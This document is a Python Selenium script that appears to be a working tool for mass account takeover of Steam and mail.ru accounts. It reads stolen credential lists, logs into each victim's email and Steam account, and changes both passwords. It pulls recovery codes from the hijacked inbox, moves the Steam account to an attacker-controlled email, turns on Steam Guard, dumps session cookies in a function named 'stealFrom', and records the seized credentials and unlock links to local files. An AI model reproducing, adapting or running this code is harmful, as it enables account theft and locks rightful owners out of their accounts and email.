from addons.DeleteEverything import *
from addons.parseMail import *


def Convert(string):
    li = list(string.split(":"))
    return li


steamCodeString = '/html/body/div[5]/div/div[1]/div[1]/div/div[2]/span/div[2]/div/div/div/div/div/div/div[2]/div[1]/div[3]/div[2]/div/div/div/div/div/div/div/div/div/div/center[1]/div/div/table/tbody/tr/td/table/tbody/tr/td/table/tbody/tr[1]/td/table/tbody/tr[2]/td/table[3]/tbody/tr/td/table/tbody/tr/td/table/tbody/tr/td'
steamCodeStringOld = '/html/body/div[2]/div/div[5]/div/div/div/div/div/div/div/div/div/div/div/div/div/div[6]/div[2]/div[2]/div[10]/div/div/div/div[4]/div/div[2]/div/div/div/div/center[1]/table/tbody/tr/td/table/tbody/tr/td/table/tbody/tr[1]/td/table/tbody/tr[2]/td/table[3]/tbody/tr/td/table/tbody/tr/td/table/tbody/tr/td'


def loginIntoSteam(driver, wait, EmailNew, EmailNewPass, EmailOld, EmailOldPass):
    captcha = 0
    invalid = 0
    #captcha
    try:
        time.sleep(2)
        driver.find_element_by_css_selector('#captchaRefreshLink').click()
        captcha = 1
    except ElementNotInteractableException:
        captcha = 0
    wait.until(ec.element_to_be_clickable((By.CSS_SELECTOR, '.btn_blue_steamui'))).click()
    #invalid
    try:
        time.sleep(2)
        if driver.find_element_by_css_selector('#error_display').text == 'The account name or password that you have entered is incorrect.':
            invalid = 1
        else:
            invalid = 0
    except:
        pass

    if invalid == 1:
        f = open("invalidEmailS.txt", "a")
        data = str(EmailNew + ' ' + EmailNewPass + '         ' + EmailOld + ' ' + EmailOldPass.strip() + '\n')
        f.write(data)
        f.close()
        driver.close()
        driver.switch_to.window(driver.window_handles[0])
        driver.close()
    else:
        wait.until(ec.element_to_be_clickable((By.CSS_SELECTOR, '.user_avatar'))).click()


def passgen(x):
    characters = string.ascii_letters + string.digits
    password = "".join(choice(characters) for x in range(randint(12, 14)))
    return password


def changeEmail(driver, wait):
    pass


def retoggleAllTheAddons(driver):
    driver.get("about:addons")
    driver.find_element_by_id("category-extension").click()
    driver.execute_script("""
        let hb = document.getElementById("html-view-browser");
        let al = hb.contentWindow.window.document.getElementsByTagName("addon-list")[0];
        let cards = al.getElementsByTagName("addon-card");
        for(let card of cards){
            card.addon.disable();
            card.addon.enable();
        }
    """)


def NotAllowed(driver):
    change_password = 'You have exceeded the number of allowed recovery attempts. Please try again later.'


def stealFrom(driver, ID64, where):
    driver.get(where)
    file = str('kuki/' + ID64 + '.json')
    try:
        with open(file, mode='a') as f:
            for c in driver.get_cookies():
                f.write(json.dumps(c) + '\n')
    except:
        traceback.print_exc()


def addWhere(driver, ID64, where, dom):
    driver.get(where)
    file = str('kuki/' + ID64 + '.json')
    try:
        with open(file, mode='r') as f:
            for line in f:
                if dom in json.loads(line)['domain']:
                    driver.add_cookie(json.loads(line))
    except:
        traceback.print_exc()


def stealcock(driver, ID64):
    stealFrom(driver, ID64, where='https://store.steampowered.com/account')
    stealFrom(driver, ID64, where='https://steamcommunity.com')
    stealFrom(driver, ID64, where='https://help.steampowered.com/en')


def addcock(driver, ID64):
    addWhere(driver, ID64, where='https://store.steampowered.com/account', dom ='store.steampowered.com')
    addWhere(driver, ID64, where='https://steamcommunity.com', dom='steamcommunity.com')
    addWhere(driver, ID64, where='https://help.steampowered.com/en', dom='help.steampowered.com')
    acc = str('https://steamcommunity.com/profiles/' + ID64)
    driver.get(acc)


def main(newLine, profile):
    arr = Convert(newLine)
    EmailNew = arr[0]
    EmailNewPass = arr[1]
    Steam = arr[2]
    SteamPass = arr[3]
    EmailOld = arr[4]
    EmailOldPass = arr[5]
    print(datetime.now())
    print(EmailOld)
    print(EmailOldPass)
    options = Options()
    options.headless = True
    binary = FirefoxBinary("C:\\Program Files\\Mozilla Firefox\\firefox.exe")
    driver = webdriver.Firefox(firefox_profile=profile, firefox_binary=binary)
    wait = WebDriverWait(driver, 1800)
    # retoggleAllTheAddons(driver)
    driver.delete_all_cookies()
    driver.get('https://mail.ru/')
    wait.until(ec.element_to_be_clickable((By.CSS_SELECTOR, '.email-input'))).send_keys(EmailOld)
    wait.until(ec.element_to_be_clickable((By.CSS_SELECTOR, '.button'))).click()
    wait.until(ec.element_to_be_clickable((By.CSS_SELECTOR, '.password-input'))).send_keys(EmailOldPass)
    wait.until(ec.element_to_be_clickable((By.CSS_SELECTOR, '.second-button'))).click()
    window_before = driver.window_handles[0]
    driver.switch_to.window(window_before)
    driver.execute_script("window.open('https://store.steampowered.com/login/', 'new window')")
    window_after = driver.window_handles[1]
    driver.switch_to.window(window_after)
    wait.until(ec.element_to_be_clickable((By.XPATH, '//*[@id="input_username"]'))).send_keys(Steam)
    wait.until(ec.element_to_be_clickable((By.XPATH, '//*[@id="input_password"]'))).send_keys(SteamPass)
    loginIntoSteam(driver, wait, EmailNew, EmailNewPass, EmailOld, EmailOldPass)
    url = jSonParse(driver, wait)
    ID64 = re.findall("\d+", url)[0]
    print(url)
    driver.execute_script("ChangeLanguage( 'english' )")
    # testingPlace
    driver.get('https://store.steampowered.com/account/')
    wait.until(ec.element_to_be_clickable((By.CSS_SELECTOR,
                                           'div.account_setting_block:nth-child(6) > div:nth-child(1) > div:nth-child(2) > div:nth-child(2) > a:nth-child(1)'))).click()
    wait.until(ec.element_to_be_clickable((By.CSS_SELECTOR,
                                           'html.responsive body.v6.responsive_page div.responsive_page_frame.with_header div.responsive_page_content div.responsive_page_template_content div.page_body_ctn div#page_content.page_content.page_loaded div#wizard_contents div.wizard_content_wrapper a.help_wizard_button.help_wizard_arrow_right'))).click()
    wait.until(ec.element_to_be_clickable((By.CSS_SELECTOR, 'div.account_recovery_submit:nth-child(3) > a:nth-child(1) > span:nth-child(1)')))
    time.sleep(2)
    TIME = datetime.now() - timedelta(0, 60)
    TIME = TIME.strftime("%H:%M")
    driver.switch_to.window(driver.window_handles[0])
    wait.until(ec.element_to_be_clickable((By.CSS_SELECTOR, '#PH_logoutLink')))
    driver.get('https://id.mail.ru/security')
    wait.until(ec.element_to_be_clickable((By.CSS_SELECTOR, '.base-0-2-82'))).click()
    wait.until(ec.element_to_be_clickable((By.CSS_SELECTOR,
                                           'div.field-0-2-146:nth-child(7) > div:nth-child(2) > div:nth-child(1) > div:nth-child(1) > input:nth-child(1)'))).send_keys(
        EmailOldPass)
    EmailPassNew = passgen(randint(1, 200))
    # print('new email pass')
    print(EmailPassNew)
    wait.until(ec.element_to_be_clickable((By.CSS_SELECTOR,
                                           '.tooltip-0-2-167 > div:nth-child(1) > div:nth-child(1) > div:nth-child(1) > input:nth-child(1)'))).send_keys(
        EmailPassNew)
    wait.until(ec.element_to_be_clickable((By.CSS_SELECTOR,
                                           'div.field-0-2-146:nth-child(14) > div:nth-child(2) > div:nth-child(1) > div:nth-child(1) > input:nth-child(1)'))).send_keys(
        EmailPassNew)
    wait.until(
        ec.element_to_be_clickable((By.CSS_SELECTOR, 'button.base-0-2-82:nth-child(20) > span:nth-child(1)'))).click()
    wait.until(ec.element_to_be_clickable((By.CSS_SELECTOR, '.cross-0-2-97.mobileCross-0-2-104'))).click() #resetpass close
    logging.info(
        str(datetime.now()) + ' changed ' + EmailOld + ':' + EmailOldPass + ' TO ' + EmailOld + ':' + EmailPassNew)
    print(EmailOld + ':' + EmailPassNew)
    #
    cont = findSteamCode(driver, TIME)
    delContent(driver)
    driver.switch_to.window(driver.window_handles[1])
    SteamPassNew = passgen(randint(1, 200))
    print(SteamPassNew)
    f = open("checker.txt", "a")
    data = str(
        EmailNew + ' ' + EmailNewPass + ' ' + Steam + ' ' + SteamPassNew + '  ' + url + '     ' + EmailOld + ' ' + EmailPassNew + '\n')
    logging.info(str(datetime.now()) + ' ' + data)
    f.write(data)
    f.close()
    print(EmailNew + ':' + EmailNewPass + ':' + Steam + ':' + SteamPassNew + ':' + EmailOld + ':' + EmailPassNew)
    wait.until(ec.element_to_be_clickable((By.CSS_SELECTOR, '#forgot_login_code'))).send_keys(cont)
    wait.until(ec.element_to_be_clickable(
        (By.XPATH, '/html/body/div/div[7]/div[2]/div[2]/div/div[2]/div/div[4]/form/div[3]/input'))).click()
    wait.until(ec.element_to_be_clickable((By.ID, 'password_reset'))).send_keys(SteamPassNew)
    wait.until(ec.element_to_be_clickable((By.ID, 'password_reset_confirm'))).send_keys(SteamPassNew)
    time.sleep(3)
    wait.until(ec.element_to_be_clickable((By.CSS_SELECTOR, '.account_recovery_submit > input:nth-child(1)'))).click()
    logging.info(
        str(datetime.now()) + ' changed ' + Steam + ':' + SteamPass + ' TO ' + Steam + ':' + SteamPassNew)
    driver.switch_to.window(driver.window_handles[0])
    wait.until(ec.element_to_be_clickable((By.CSS_SELECTOR, '#PH_logoutLink')))
    linkTlock = getLockLink(driver)
    logging.info(
        str(datetime.now()) + ' got lock link ' + Steam + ":" + linkTlock)
    print(Steam + ":" + linkTlock)
    delContent(driver)
    driver.switch_to.window(driver.window_handles[1])
    driver.get('https://store.steampowered.com/login/')
    wait.until(ec.element_to_be_clickable((By.XPATH, '//*[@id="input_username"]'))).send_keys(Steam)
    wait.until(ec.element_to_be_clickable((By.XPATH, '//*[@id="input_password"]'))).send_keys(SteamPassNew)
    loginIntoSteam(driver, wait, EmailNew, EmailNewPass, EmailOld, EmailOldPass)
    driver.get('https://store.steampowered.com/account/')
    wait.until(ec.element_to_be_clickable((By.CSS_SELECTOR,
                                           'div.account_setting_block:nth-child(4) > div:nth-child(1) > div:nth-child(3) > a:nth-child(1)'))).click()
    wait.until(ec.element_to_be_clickable((By.CSS_SELECTOR, 'a.help_wizard_button:nth-child(4)'))).click()
    wait.until(ec.element_to_be_clickable(
        (By.CSS_SELECTOR, 'div.account_recovery_submit:nth-child(3) > a:nth-child(1) > span:nth-child(1)')))
    time.sleep(2)
    driver.switch_to.window(driver.window_handles[0])
    TIME = datetime.now() - timedelta(0, 60)
    TIME = TIME.strftime("%H:%M")
    wait.until(ec.element_to_be_clickable((By.CSS_SELECTOR, '#PH_logoutLink')))
    cont = findSteamCode(driver, TIME)
    driver.switch_to.window(driver.window_handles[1])
    wait.until(ec.element_to_be_clickable((By.CSS_SELECTOR, '#forgot_login_code'))).send_keys(cont)
    wait.until(ec.element_to_be_clickable((By.CSS_SELECTOR, '.account_recovery_submit > input:nth-child(1)'))).click()
    wait.until(ec.element_to_be_clickable((By.CSS_SELECTOR, '#email_reset'))).send_keys(EmailNew)
    wait.until(ec.element_to_be_clickable((By.CSS_SELECTOR, '#change_email_area > input:nth-child(1)'))).click()
    TIME = datetime.now() - timedelta(0, 60)
    TIME = TIME.strftime("%H:%M")
    driver.switch_to.window(driver.window_handles[0])
    driver.get('https://e.mail.ru/inbox/')
    wait.until(ec.element_to_be_clickable((By.CSS_SELECTOR, '#PH_logoutLink'))).click()
    driver.get('https://mail.ru/')
    wait.until(ec.element_to_be_clickable((By.CSS_SELECTOR, '.email-input'))).clear()
    wait.until(ec.element_to_be_clickable((By.CSS_SELECTOR, '.email-input'))).send_keys(EmailNew)
    wait.until(ec.element_to_be_clickable((By.CSS_SELECTOR, '.button'))).click()
    wait.until(ec.element_to_be_clickable((By.CSS_SELECTOR, '.password-input'))).send_keys(EmailNewPass)
    wait.until(ec.element_to_be_clickable((By.CSS_SELECTOR, '.second-button'))).click()
    try:
        driver.find_element_by_css_selector('a.btn > span: nth - child(1)')
        steam(wait, driver, TIME)

    except NoSuchElementException:
        steam(wait, driver, TIME)
    cont = findSteamCode(driver, TIME)
    # driver.get('https://e.mail.ru/inbox/')
    driver.switch_to.window(driver.window_handles[1])
    wait.until(ec.element_to_be_clickable((By.CSS_SELECTOR, '#email_change_code'))).send_keys(cont)
    wait.until(ec.element_to_be_clickable(
        (By.CSS_SELECTOR, 'div.account_recovery_submit:nth-child(2) > input:nth-child(1)'))).click()
    logging.info(
        str(datetime.now()) + ' email changed ' + EmailOld + ' TO ' + EmailNew)
    wait.until(ec.element_to_be_clickable(
        (By.CSS_SELECTOR,
         'div.account_setting_block:nth-child(6) > div:nth-child(1) > div:nth-child(2) > div:nth-child(1) > a:nth-child(1)'))).click()
    wait.until(ec.element_to_be_clickable(
        (By.CSS_SELECTOR,
         '#email_authenticator_form > div:nth-child(3) > div:nth-child(2) > label:nth-child(1)'))).click()
    wait.until(ec.element_to_be_clickable((By.XPATH, '//*[@id="input_username"]'))).send_keys(Steam)
    wait.until(ec.element_to_be_clickable((By.XPATH, '//*[@id="input_password"]'))).send_keys(SteamPassNew)
    try:
        driver.find_element_by_partial_link_text('rendercap')

    except NoSuchElementException:
        wait.until(ec.element_to_be_clickable((By.CSS_SELECTOR, '.btn_blue_steamui'))).click()
    TIME = datetime.now() - timedelta(0, 60)
    TIME = TIME.strftime("%H:%M")
    driver.switch_to.window(driver.window_handles[0])
    driver.get('https://e.mail.ru/inbox/')
    shit(driver)
    cont = findSteamCodeGuard(driver, TIME)
    driver.switch_to.window(driver.window_handles[1])
    wait.until(ec.element_to_be_clickable((By.XPATH, '//*[@id="authcode"]'))).send_keys(cont)
    wait.until(ec.element_to_be_clickable((By.XPATH, '/html/body/div[3]/div[3]/div/div/div/form/div[4]/div[1]/div[1]/div[1]'))).click()
    wait.until(ec.element_to_be_clickable(
        (By.XPATH, '//*[@id="success_continue_btn"]'))).click()
    wait.until(ec.element_to_be_clickable((By.CSS_SELECTOR, '.user_avatar'))).click()
    stealcock(driver, ID64)
    LetsDeleteEverything(driver, EmailNew, EmailNewPass, Steam, SteamPassNew, url, EmailOld, EmailPassNew)
    driver.get(linkTlock)
    wait.until(ec.element_to_be_clickable((By.CSS_SELECTOR, '.help_wizard_button > span:nth-child(1)'))).click()
    time.sleep(1)
    wait.until(ec.element_to_be_clickable((By.XPATH, '/html/body/div[1]/div[7]/div[2]/div[2]/div/div[2]/div/div/div[3]/a/span'))).click()
    wait.until(ec.element_to_be_clickable((By.CSS_SELECTOR, 'a.help_wizard_button:nth-child(5) > span:nth-child(1)'))).click()
    code = wait.until(ec.element_to_be_clickable((By.CSS_SELECTOR, '.code_text'))).text
    unlockurl = str('https://help.steampowered.com/en/wizard/HelpSelfUnlock?code=' + code + '&account=' + Steam)
    print(unlockurl)
    f = open("checker_withURL.txt", "a")
    data = str(
        EmailNew + ' ' + EmailNewPass + ' ' + Steam + ' ' + SteamPassNew + '  ' + url + '    ' + unlockurl + ' ' + EmailOld + ' ' + EmailPassNew + '\n')
    logging.info(
        str(datetime.now()) + ' DONE!\n ' + data)
    f.write(data)
    f.close()
    #driver.close()


if __name__ == '__main__':
    LOG_FILENAME = 'Loh.log'
    logging.basicConfig(filename=LOG_FILENAME, level=logging.INFO)
    ya = 0
    if ya == 1:
        frep = open(r'C:\Users\PussyDestroyer\PycharmProjects\chezahernya\c!replace.txt', 'r')
        #profile = FirefoxProfile("C:\\Users\\PussyDestroyer\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\7dvs7u3f.default")
        profile = FirefoxProfile("C:\\Users\\PussyDestroyer\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\dkhv3ari.cook")
    elif ya == 0:
        frep = open('c!replace.txt', 'r')
        profile = FirefoxProfile("C:\\Users\\qweqweqwe\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\bmiwtt76.default")
    else:
        frep, profile = 0, 0
    Lines = frep.readlines()
    threads = []
    logging.info(str(datetime.now()) + ' starting...')
    for line in Lines:
        t = Thread(target=main, args=(line, profile,))
        time.sleep(1)
        t.start()
        threads.append(t)
    for t in threads:
        t.join()
    input("Press Enter to continue...")
